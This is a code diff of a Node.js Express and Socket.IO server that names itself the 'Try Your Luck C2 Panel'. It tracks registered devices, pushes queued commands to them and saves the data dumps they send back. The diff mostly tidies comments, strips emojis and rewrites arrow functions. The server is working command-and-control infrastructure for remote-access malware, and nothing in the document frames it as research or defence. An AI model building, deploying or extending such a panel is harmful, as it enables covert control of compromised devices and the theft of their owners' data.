@@ -8,7 +8,7 @@ const path = require('path');
 require('dotenv').config();
 
 // ============================================
-# 🚀 INITIALIZE APP
+// INITIALIZE APP
 // ============================================
 
 const app = express();
@@ -22,7 +22,7 @@ const io = socketIo(server, {
 });
 
 // ============================================
-# 📦 MIDDLEWARE
+// MIDDLEWARE
 // ============================================
 
 app.use(cors());
@@ -31,18 +31,16 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================
-# 💾 DATA STORAGE
+// DATA STORAGE
 // ============================================
 
 const DATA_DIR = path.join(__dirname, 'data');
 const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
 
-// Ensure data directory exists
 if (!fs.existsSync(DATA_DIR)) {
     fs.mkdirSync(DATA_DIR, { recursive: true });
 }
 
-// Load devices
 let devices = {};
 if (fs.existsSync(DEVICES_FILE)) {
     try {
@@ -53,7 +51,6 @@ if (fs.existsSync(DEVICES_FILE)) {
     }
 }
 
-// Save devices function
 function saveDevices() {
     try {
         fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
@@ -62,12 +59,10 @@ function saveDevices() {
     }
 }
 
-// Get dump file path
 function getDumpFile(deviceId) {
     return path.join(DATA_DIR, `dump_${deviceId}.json`);
 }
 
-// Save dump function
 function saveDump(deviceId, type, data) {
     try {
         const dumpFile = getDumpFile(deviceId);
@@ -87,18 +82,12 @@ function saveDump(deviceId, type, data) {
 }
 
 // ============================================
-# 📡 SOCKET.IO EVENTS
+// SOCKET.IO EVENTS
 // ============================================
 
 io.on('connection', (socket) => {
-    console.log(`🟢 New connection: ${socket.id}`);
-    
-    // Send current devices list to new client
+    console.log('New connection:', socket.id);
     socket.emit('devices_update', devices);
-
-    // ==========================================
-    # 📱 REGISTER DEVICE
-    // ==========================================
 
     socket.on('register', (data) => {
         try {
@@ -125,8 +114,7 @@ io.on('connection', (socket) => {
             
             socket.deviceId = deviceId;
             saveDevices();
-            
-            console.log(`📱 Device registered: ${deviceId}`);
+            console.log('Device registered:', deviceId);
             
             io.emit('devices_update', devices);
             io.emit('device_connected', { deviceId, info: devices[deviceId].info });
@@ -138,14 +126,10 @@ io.on('connection', (socket) => {
         }
     });
 
-    // ==========================================
-    # 📤 COMMAND RESPONSE
-    // ==========================================
-
     socket.on('command_response', (data) => {
         try {
             const deviceId = data.deviceId || socket.deviceId;
-            console.log(`📥 Response from ${deviceId}:`, data);
+            console.log('Response from', deviceId, data);
             
             if (devices[deviceId]) {
                 const commands = devices[deviceId].commands || [];
@@ -170,14 +154,10 @@ io.on('connection', (socket) => {
         }
     });
 
-    // ==========================================
-    # 📂 DATA DUMP
-    // ==========================================
-
     socket.on('data_dump', (data) => {
         try {
             const deviceId = data.deviceId || socket.deviceId;
-            console.log(`📂 Data dump from ${deviceId}: ${data.type}`);
+            console.log('Data dump from', deviceId, data.type);
             
             saveDump(deviceId, data.type, data.payload);
             
@@ -198,10 +178,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // ==========================================
-    # ❌ DISCONNECT
-    // ==========================================
-
     socket.on('disconnect', () => {
         try {
             if (socket.deviceId && devices[socket.deviceId]) {
@@ -210,7 +186,7 @@ io.on('connection', (socket) => {
                 saveDevices();
                 io.emit('devices_update', devices);
                 io.emit('device_disconnected', { deviceId: socket.deviceId });
-                console.log(`🔴 Device disconnected: ${socket.deviceId}`);
+                console.log('Device disconnected:', socket.deviceId);
             }
         } catch (error) {
             console.error('Error handling disconnect:', error);
@@ -219,7 +195,7 @@ io.on('connection', (socket) => {
 });
 
 // ============================================
-# 🎯 SEND PENDING COMMANDS
+// SEND PENDING COMMANDS
 // ============================================
 
 function sendPendingCommands(socket, deviceId) {
@@ -227,11 +203,12 @@ function sendPendingCommands(socket, deviceId) {
         const device = devices[deviceId];
         if (!device) return;
         
-        const pending = (device.commands || []).filter(c => 
-            c.status === 'pending' || c.status === 'queued'
-        );
+        const pending = (device.commands || []).filter(function(c) {
+            return c.status === 'pending' || c.status === 'queued';
+        });
         
-        for (const command of pending) {
+        for (let i = 0; i < pending.length; i++) {
+            const command = pending[i];
             socket.emit('command', command);
             command.status = 'sent';
             command.sentAt = new Date().toISOString();
@@ -239,7 +216,7 @@ function sendPendingCommands(socket, deviceId) {
         
         if (pending.length > 0) {
             saveDevices();
-            console.log(`📤 Sent ${pending.length} pending commands to ${deviceId}`);
+            console.log('Sent', pending.length, 'pending commands to', deviceId);
         }
     } catch (error) {
         console.error('Error sending pending commands:', error);
@@ -247,7 +224,7 @@ function sendPendingCommands(socket, deviceId) {
 }
 
 // ============================================
-# 🌐 REST API ROUTES
+// REST API ROUTES
 // ============================================
 
 app.get('/', (req, res) => {
@@ -295,7 +272,7 @@ app.post('/api/command', (req, res) => {
         }
 
         const command = {
-            id: `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
+            id: 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
             action: action,
             params: params || {},
             issued: new Date().toISOString(),
@@ -377,16 +354,16 @@ app.delete('/api/dumps/:deviceId', (req, res) => {
 app.get('/api/stats', (req, res) => {
     try {
         const total = Object.keys(devices).length;
-        const online = Object.values(devices).filter(d => d.connected).length;
+        const online = Object.values(devices).filter(function(d) { return d.connected; }).length;
         let commands = 0;
         let dumps = 0;
         
-        Object.values(devices).forEach(d => {
+        Object.values(devices).forEach(function(d) {
             commands += (d.commands || []).length;
         });
         
         const files = fs.readdirSync(DATA_DIR);
-        files.forEach(file => {
+        files.forEach(function(file) {
             if (file.startsWith('dump_')) {
                 try {
                     const content = JSON.parse(fs.readFileSync(path.join(DATA_DIR, file), 'utf8'));
@@ -440,38 +417,38 @@ app.get('*', (req, res) => {
 });
 
 // ============================================
-# 🚀 START SERVER
+// START SERVER
 // ============================================
 
 const PORT = process.env.PORT || 10000;
 const HOST = '0.0.0.0';
 
-server.listen(PORT, HOST, () => {
+server.listen(PORT, HOST, function() {
     console.log('='.repeat(50));
-    console.log('🖥️  Try Your Luck C2 Panel');
+    console.log('Try Your Luck C2 Panel');
     console.log('='.repeat(50));
-    console.log(`📍 Server running on port: ${PORT}`);
-    console.log(`📍 URL: http://localhost:${PORT}`);
-    console.log(`📱 Waiting for devices to connect...`);
+    console.log('Server running on port:', PORT);
+    console.log('URL: http://localhost:' + PORT);
+    console.log('Waiting for devices to connect...');
     console.log('='.repeat(50));
 });
 
 // Graceful shutdown
-process.on('SIGINT', () => {
-    console.log('\n🛑 Shutting down gracefully...');
+process.on('SIGINT', function() {
+    console.log('\nShutting down gracefully...');
     saveDevices();
-    server.close(() => {
-        console.log('✅ Server closed');
+    server.close(function() {
+        console.log('Server closed');
         process.exit(0);
     });
 });
 
-process.on('uncaughtException', (error) => {
+process.on('uncaughtException', function(error) {
     console.error('Uncaught Exception:', error);
     saveDevices();
 });
 
-process.on('unhandledRejection', (reason, promise) => {
+process.on('unhandledRejection', function(reason, promise) {
     console.error('Unhandled Rejection at:', promise, 'reason:', reason);
     saveDevices();
 });
